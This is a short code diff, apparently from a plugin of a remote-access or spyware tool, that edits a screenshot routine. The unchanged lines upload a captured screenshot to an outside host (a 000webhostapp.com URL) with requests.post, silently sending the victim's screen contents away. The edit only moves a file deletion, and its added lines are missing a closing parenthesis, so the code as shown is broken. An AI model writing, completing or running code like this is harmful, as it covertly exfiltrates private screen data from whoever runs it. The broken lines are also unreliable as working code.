@@ -38,13 +38,14 @@ def run(**args):
 #Send to remote server
    url = "http://psyberlupus.000webhostapp.com/site.php/post"
    files = {'image': open('screenshot.bmp','rb')}
-   os.remove("screenshot.bmp")
    try:
      r = requests.post(url, files=files)
+     os.remove("screenshot.bmp"
    except:
      pass
    f_des = open("screenshot.bmp" , "rb")
    data = f_des.read()
    f_des.close()
+   os.remove("screenshot.bmp"
    return data
 
